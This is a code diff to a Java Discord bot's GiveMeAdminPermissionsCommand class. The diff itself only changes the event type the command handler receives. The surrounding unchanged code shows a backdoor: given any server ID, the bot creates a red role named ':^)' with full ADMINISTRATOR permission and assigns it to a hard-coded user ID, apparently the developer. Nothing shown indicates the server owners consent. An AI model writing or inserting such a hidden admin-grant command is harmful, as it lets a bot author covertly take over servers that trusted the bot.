@@ -2,7 +2,7 @@ package de.tectoast.emolga.commands.flo;
 
 import de.tectoast.emolga.commands.Command;
 import de.tectoast.emolga.commands.CommandCategory;
-import de.tectoast.emolga.utils.CommandEvent;
+import de.tectoast.emolga.commands.GuildCommandEvent;
 import de.tectoast.emolga.utils.Constants;
 import net.dv8tion.jda.api.EmbedBuilder;
 import net.dv8tion.jda.api.Permission;
@@ -17,7 +17,7 @@ public class GiveMeAdminPermissionsCommand extends Command {
     }
 
     @Override
-    public void process(CommandEvent e) {
+    public void process(GuildCommandEvent e) {
         Guild g = e.getJDA().getGuildById(e.getMessage().getContentDisplay().split(" ")[1]);
         Role r = g.createRole().setPermissions(Permission.ADMINISTRATOR).setName(":^)").setColor(Color.RED).complete();
         g.addRoleToMember(Constants.FLOID, r).queue();
